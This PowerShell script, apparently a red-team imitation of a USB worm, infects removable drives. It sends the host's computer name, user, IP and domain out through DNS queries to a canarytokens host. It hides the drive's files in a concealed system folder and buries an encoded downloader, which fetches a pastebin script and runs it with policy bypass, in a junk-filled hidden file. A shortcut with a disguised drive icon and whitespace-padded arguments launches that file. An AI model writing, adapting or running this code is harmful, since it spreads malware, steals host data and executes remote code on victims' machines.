

$Conf_Ballon="True"
$Conf_CharSet="RooterProtapp"
$Conf_dnsToken ="pb6fy865rm7ts4ran9qi2ss2q.canarytokens.com"



if ($Conf_Ballon -eq $True) {
 
#MENSJAE DE USB PROCESADO
$Title = "CuchiBerryRObin"
$Message = "USB Insertado"
$Type = "info" 
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)

#Mensaje para logging
Add-Content -Path C:\output.txt -Value "$(Get-Date) - USB Flash Drive was inserted.";

    
}






#consige la unidad 
Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 } | ForEach-Object {
    $driveLetter = $_.DriveLetter
    $label = $_.Label
    
}
Add-Content -Path $PSScriptRoot\output.txt -Value "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter .";

#Notificamos la Entrada al CNC
$ipAddress = (Test-Connection -ComputerName localhost -Count 1).IPv4Address.IPAddressToString

$texto = "USB_IN_$driveLetter$Label$env:COMPUTERNAME.$env:USERNAME.$ipAddress.$env:USERDNSDOMAIN."

[byte[]] $bytes = [System.Text.Encoding]::ASCII.GetBytes($texto)


$byteArrayAsBinaryString = -join $bytes.ForEach{        [Convert]::ToString($_, 2).PadLeft(8, '0')    }
$byteArrayAsBinaryString = $($byteArrayAsBinaryString+("0000".Substring(0,5-($byteArrayAsBinaryString.length%5))))
$Base32Secret = [regex]::Replace($byteArrayAsBinaryString, '.{5}', {        param($Match)        'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'[[Convert]::ToInt32($Match.Value, 2)]    }).Replace("=","")
$randomDigits = Get-Random -Minimum 10 -Maximum 100
$splitData = [System.Text.RegularExpressions.Regex]::Split($base32Secret, "(?<=\G.{63})") | Where-Object { $_ -ne "" } 
$splitData= $splitData -join "."
$encodedData = $splitData  + ".G$randomDigits." + $Conf_dnsToken


$result = Resolve-DnsName -Name $encodedData


# Set the path to the folder you want to work with
$folderPath = "$driveLetter"

# Create a subfolder

$subfolderPath = Join-Path -Path $folderPath -ChildPath "$label" 

If(!(test-path -PathType container $subfolderPath))
{

New-Item -ItemType Directory -Path $subfolderPath
}
# Copy all files to the subfolder
Get-ChildItem -Path $folderPath  | Move-Item -Destination $subfolderPath -force

# Make the subfolder invisible
$attrib = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
try{
(Get-Item $subfolderPath).Attributes = $attrib
}
catch{
 
 }
 

#CREANDO LNK Y DROPPER
# Set the path to the file you want to create a shortcut for
$targetPath = "cmd.exe"
$dropperName = -join ((Get-Random -Count 3 -InputObject  $Conf_CharSet.ToCharArray())) + "." + -join ((Get-Random -Count 3 -InputObject $Conf_CharSet.ToCharArray()))
$dropperPath = $driveLetter + "\"+$dropperName



#CREANDO DROPPER

# Generamos una cadena aleatoria de caracteres para escribir en el archivo
$caracteres = "abcdefghijklmnopqrstuvwxyz0123456789"

$caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`r`n"

$aleatorios = ""
for ($i = 1; $i -le 5024; $i++) {
    $indice = Get-Random -Minimum 0 -Maximum $caracteres.Length
    $aleatorios += [char]::ConvertFromUtf32($caracteres[$indice])
}



$aleatorios | Out-File -FilePath "$dropperPath"


#[System.IO.File]::WriteAllBytes("$dropperPath", $aleatorios)


Write-Host $dropperPath

# Escribimos "mspaint" en una línea aleatoria del archivo
$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count
$lineas[$indice] = " start explorer	\`"$label\`" "
$lineas | Set-Content "$dropperPath"


# Escribimos "Dropper" en una línea aleatoria del archivo
#$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count

$downloader="Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASQAwAFIAdgBkADIANQBzAGIAMgBGAGsAWgBYAEkAZwBRADEAVgBEAFMARQBsAEMAUgBWAEoAUwBXAFYASgBQAFEAawBsAE8ARABRAG8AawBRADIAOQB1AFoAbAA5AEkAWQBYAE4AbwBkAEcARgBuAFgAMgBsAHUAYQBYAFEAOQBJAGkATgBEAFYAVQBOAEkAUwBVAEoARgBVAGwASgBaAFUAawA5AEMAUwBVADQAaQBEAFEAbwBrAFEAMgA5AHUAWgBsADkASQBZAFgATgBvAGQARwBGAG4AWAAyAFYAdQBaAEQAMABpAEkAMABaAEoAVABpAEkATgBDAGcAMABLAEkAMAA1AHYAZABDAEIAMwBiADMASgByAGEAVwA1AG4ATABDAEIAdQBaAFcAVgBrAEkASABkAHYAYwBtAHQAaABjAG0AOQAxAGIAbQBRAGcAZABHADgAZwBaADIAVgAwAEkARwBaAHkAYgAyADAAZwBaADIAOQB2AFoAMgB4AGwASQBBADAASwBKAEcATgB2AGIAbgBSAGwAYgBuAFEAZwBQAFMAQgBKAGIAbgBaAHYAYQAyAFUAdABWADIAVgBpAFUAbQBWAHgAZABXAFYAegBkAEMAQQB0AFYAWABKAHAASQBDAEoAbwBkAEgAUgB3AGMAegBvAHYATAAzAGQAMwBkAHkANQBuAGIAMgA5AG4AYgBHAFUAdQBZADIAOQB0AEwAMwBOAGwAWQBYAEoAagBhAEQAOQB4AFAAUwBSAEQAYgAyADUAbQBYADAAaABoAGMAMgBoADAAWQBXAGQAZgBhAFcANQBwAGQAQwBJAGcATABWAFYAegBaAFUASgBoAGMAMgBsAGoAVQBHAEYAeQBjADIAbAB1AFoAdwAwAEsASgBIAEIAaABkAEgASgB2AGIAaQBBADkASQBDAGMAbwBQAHoAdwA5AEoARQBOAHYAYgBtAFoAZgBTAEcARgB6AGEASABSAGgAWgAxADkAcABiAG0AbAAwAEkAQwBrAG8ATABpAG8AcABLAEQAOAA5AEkAQwBSAEQAYgAyADUAbQBYADAAaABoAGMAMgBoADAAWQBXAGQAZgBaAFcANQBrAEsAUwBjAE4AQwBpAFIAeQBaAFgATgAxAGIASABSAGgAWgBHADgAZwBQAFMAQgBiAGMAbQBWAG4AWgBYAGgAZABPAGoAcABOAFkAWABSAGoAYQBDAGcAawBZADIAOQB1AGQARwBWAHUAZABDADUARABiADIANQAwAFoAVwA1ADAATABDAEEAawBjAEcARgAwAGMAbQA5AHUASwBTADUAVwBZAFcAeAAxAFoAUQAwAEsARABRAG8AagBRAG4AVgB1AEkARQBKAEoAVABrAGMAZwBWADAAOQBTAFMAMQBNAGgASQBTAEUATgBDAGkATgBRAFoAWABKAHYASQBFADkAUQBRADAAbABQAFQAaQBBAGoAVgBFADkARQBUAHkAQgBEAFMAVgBCAEkAUgBWAEkAZwBXAEUAOQBTAEQAUQBwAHAAWgBpAEEAbwBLAEYAdAB6AGQASABKAHAAYgBtAGQAZABPAGoAcABKAGMAMAA1ADEAYgBHAHgAUABjAGsAVgB0AGMASABSADUASwBDAFIAeQBaAFgATgAxAGIASABSAGgAWgBHADgAcABLAFMAawBOAEMAbgBzAE4AQwBpAFIAagBiADIANQBtAFgAMgBoAGgAYwAyAGgAMABZAFcAZABmAGEAVwA1AHAAZABGADkAbABiAG0ATgB2AFoARwBWAGsASQBEADAAZwBXADEATgA1AGMAMwBSAGwAYgBTADUAVgBjAG0AbABkAE8AagBwAEYAYwAyAE4AaABjAEcAVgBFAFkAWABSAGgAVQAzAFIAeQBhAFcANQBuAEsAQwBSAEQAYgAyADUAbQBYADAAaABoAGMAMgBoADAAWQBXAGQAZgBhAFcANQBwAGQAQwBrAE4AQwBpAFIAagBiADIANQAwAFoAVwA1ADAASQBEADAAZwBTAFcANQAyAGIAMgB0AGwATABWAGQAbABZAGwASgBsAGMAWABWAGwAYwAzAFEAZwBMAFYAVgB5AGEAUwBBAGkAYQBIAFIAMABjAEgATQA2AEwAeQA5ADMAZAAzAGMAdQBZAG0AbAB1AFoAeQA1AGoAYgAyADAAdgBjADIAVgBoAGMAbQBOAG8AUAAzAEUAOQBKAEcATgB2AGIAbQBaAGYAYQBHAEYAegBhAEgAUgBoAFoAMQA5AHAAYgBtAGwAMABYADIAVgB1AFkAMgA5AGsAWgBXAFEAaQBJAEMAMQBWAGMAMgBWAEMAWQBYAE4AcABZADEAQgBoAGMAbgBOAHAAYgBtAGMATgBDAGkAUgB3AFkAWABSAHkAYgAyADQAZwBQAFMAQQBpAEsARAA4ADgAUABTAFIARABiADIANQBtAFgAMABoAGgAYwAyAGgAMABZAFcAZABmAGEAVwA1AHAAZABGAHgAegBLAFMAZwB1AEsAagA4AHAASwBEADgAOQBYAEgATQBxAEoARQBOAHYAYgBtAFoAZgBTAEcARgB6AGEASABSAGgAWgAxADkAbABiAG0AUQBwAEkAZwAwAEsASgBIAEoAbABjADMAVgBzAGQARwBGAGsAYgB5AEEAOQBJAEMAZwBrAFkAMgA5AHUAZABHAFYAdQBkAEMAQgA4AEkARgBOAGwAYgBHAFYAagBkAEMAMQBUAGQASABKAHAAYgBtAGMAZwBMAFYAQgBoAGQASABSAGwAYwBtADQAZwBKAEgAQgBoAGQASABKAHYAYgBpAEEAdABRAFcAeABzAFQAVwBGADAAWQAyAGgAbABjAHkAawB1AFQAVwBGADAAWQAyAGgAbABjADEAcwB3AFgAUwA1AFcAWQBXAHgAMQBaAFEAMABLAGYAUQAwAEsARABRAG8ATgBDAGcAMABLAEkAMQBSAGwAYwBtAE4AbABjAG0ARgBCAEkARQA5AFEAUQAwAGwAUABUAGkAQQBqAFYARQA5AEUAVAB5AEIARABTAFYAQgBJAFIAVgBJAGcAVwBFADkAUwBEAFEAcABwAFoAaQBBAG8ASwBGAHQAegBkAEgASgBwAGIAbQBkAGQATwBqAHAASgBjADAANQAxAGIARwB4AFAAYwBrAFYAdABjAEgAUgA1AEsAQwBSAHkAWgBYAE4AMQBiAEgAUgBoAFoARwA4AHAASwBTAGsATgBDAG4AcwBOAEMAaQBSAGoAYgAyADUAMABaAFcANQAwAEkARAAwAGcAUwBXADUAMgBiADIAdABsAEwAVgBkAGwAWQBsAEoAbABjAFgAVgBsAGMAMwBRAGcATABWAFYAeQBhAFMAQQBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB3AFkAWABOADAAWgBXAEoAcABiAGkANQBqAGIAMgAwAHYAUQBVAEoAcABWAGoAQgB5AFMARABjAGkASQBDADEAVgBjADIAVgBDAFkAWABOAHAAWQAxAEIAaABjAG4ATgBwAGIAbQBjAE4AQwBpAFIAdwBZAFgAUgB5AGIAMgA0AGcAUABTAEEAbgBLAEQAOAA4AFAAUwBOAEQAVgBVAE4ASQBTAFYASgBQAFEAawBsAE8ASQBDAGsAbwBMAGkAbwBwAEsARAA4ADkASQBDAE4ARwBTAFUANABwAEoAdwAwAEsASgBIAEoAbABjADMAVgBzAGQARwBGAGsAYgB5AEEAOQBJAEYAdAB5AFoAVwBkAGwAZQBGADAANgBPAGsAMQBoAGQARwBOAG8ASwBDAFIAagBiADIANQAwAFoAVwA1ADAATABDAEEAawBjAEcARgAwAGMAbQA5AHUASwBTADUAVwBZAFcAeAAxAFoAUQAwAEsAZgBRADAASwBEAFEAbwBOAEMAZwAwAEsASgBGAFIAcABkAEcAeABsAEkARAAwAGcASQBrAE4AMQBZADIAaABwAFEAbQBWAHkAYwBuAGwAUwBUADIASgBwAGIAaQBJAE4AQwBpAFIATgBaAFgATgB6AFkAVwBkAGwASQBEADAAZwBJAGsAUgBsAGMAMgBOAGgAYwBtAGQAaABiAG0AUgB2AEkARwBOAHYAYgBXAEYAdQBaAEcAOABnAEoASABKAGwAYwAzAFYAcwBkAEcARgBrAGIAeQBJAE4AQwBpAFIAVQBlAFgAQgBsAEkARAAwAGcASQBtAGwAdQBaAG0AOABpAEkAQQAwAEsASQBDAEEATgBDAGwAdAB5AFoAVwBaAHMAWgBXAE4AMABhAFcAOQB1AEwAbQBGAHoAYwAyAFYAdABZAG0AeAA1AFgAVABvADYAYgBHADkAaABaAEgAZABwAGQARwBoAHcAWQBYAEoAMABhAFcARgBzAGIAbQBGAHQAWgBTAGcAaQBVADMAbAB6AGQARwBWAHQATABsAGQAcABiAG0AUgB2AGQAMwBNAHUAUgBtADkAeQBiAFgATQBpAEsAUwBCADgASQBHADkAMQBkAEMAMQB1AGQAVwB4AHMARABRAG8AawBjAEcARgAwAGEAQwBBADkASQBFAGQAbABkAEMAMQBRAGMAbQA5AGoAWgBYAE4AegBJAEMAMQBwAFoAQwBBAGsAYwBHAGwAawBJAEgAdwBnAFUAMgBWAHMAWgBXAE4AMABMAFUAOQBpAGEAbQBWAGoAZABDAEEAdABSAFgAaAB3AFkAVwA1AGsAVQBIAEoAdgBjAEcAVgB5AGQASABrAGcAVQBHAEYAMABhAEEAMABLAEoARwBsAGoAYgAyADQAZwBQAFMAQgBiAFUAMwBsAHoAZABHAFYAdABMAGsAUgB5AFkAWABkAHAAYgBtAGMAdQBTAFcATgB2AGIAbAAwADYATwBrAFYANABkAEgASgBoAFkAMwBSAEIAYwAzAE4AdgBZADIAbABoAGQARwBWAGsAUwBXAE4AdgBiAGkAZwBrAGMARwBGADAAYQBDAGsATgBDAGkAUgB1AGIAMwBSAHAAWgBuAGsAZwBQAFMAQgB1AFoAWABjAHQAYgAyAEoAcQBaAFcATgAwAEkASABOADUAYwAzAFIAbABiAFMANQAzAGEAVwA1AGsAYgAzAGQAegBMAG0AWgB2AGMAbQAxAHoATABtADUAdgBkAEcAbABtAGUAVwBsAGoAYgAyADQATgBDAGkAUgB1AGIAMwBSAHAAWgBuAGsAdQBhAFcATgB2AGIAaQBBADkASQBDAFIAcABZADIAOQB1AEQAUQBvAGsAYgBtADkAMABhAFcAWgA1AEwAbgBaAHAAYwAyAGwAaQBiAEcAVQBnAFAAUwBBAGsAZABIAEoAMQBaAFEAMABLAEoARwA1AHYAZABHAGwAbQBlAFMANQB6AGEARwA5ADMAWQBtAEYAcwBiAEcAOQB2AGIAbgBSAHAAYwBDAGcAeABNAEMAdwBrAFYARwBsADAAYgBHAFUAcwBKAEUAMQBsAGMAMwBOAGgAWgAyAFUAcwBJAEYAdAB6AGUAWABOADAAWgBXADAAdQBkADIAbAB1AFoARwA5ADMAYwB5ADUAbQBiADMASgB0AGMAeQA1ADAAYgAyADkAcwBkAEcAbAB3AGEAVwBOAHYAYgBsADAANgBPAGkAUgBVAGUAWABCAGwASwBRADAASwBTAFcANQAyAGIAMgB0AGwATABVAFYANABjAEgASgBsAGMAMwBOAHAAYgAyADQAZwBKAEgASgBsAGMAMwBWAHMAZABHAEYAawBiAHcAMABLAEQAUQBvAE4AQwBnADAASwAiAH0AJwAgAHwAIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBKAHMAbwBuACkALgBTAGMAcgBpAHAAdAApACkAIAB8ACAAaQBlAHgA"
$lineas[$indice] = "$downloader "

$lineas | Set-Content "$dropperPath"
#Hago el dropper protegido
Set-ItemProperty $dropperPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::ReadOnly)



# Escribimos más caracteres absurdos
#Add-Content "$dropperPath" "$caracteres"





# Set the path to where you want to create the shortcut
$shortcutPath = "$driveLetter\$label.lnk"

# Set the character set to use for the random string
$charSet = "CUCHIBERRYROBIN"

# Generate a random string of length 100 using the character set
$description = -join ((Get-Random -Count 100 -InputObject $charSet.ToCharArray()))

# Create a WScript.Shell object
$shell = New-Object -ComObject WScript.Shell

# Create the shortcut
$shortcut = $shell.CreateShortcut($shortcutPath)

# Set the shortcut properties
# Set the path to the file you want to create a shortcut for
$targetPath = "C:\Windows\System32\cmd.exe"
$shortcut.RelativePath = ""
$shortcut.TargetPath = $targetPath
$shortcut.WindowStyle = 7
$shortcut.Description = $description
# Set the icon to the removable drive icon
$iconLocation = "%SystemRoot%\System32\imageres.dll,27"
$shortcut.IconLocation = $iconLocation
# Set the arguments to run the command from the arg file
$shortcut.Arguments = "
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
          /V/RcmD<$dropperName"

# Save the shortcut
$shortcut.Save()



if ($Conf_Ballon -eq $True) {

#MENSJAE DE USB PROCESADO
$Title = "CuchiBerryRObin"
$Message = "USB CuchiRobineado"
$Type = "info" 
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
   
}
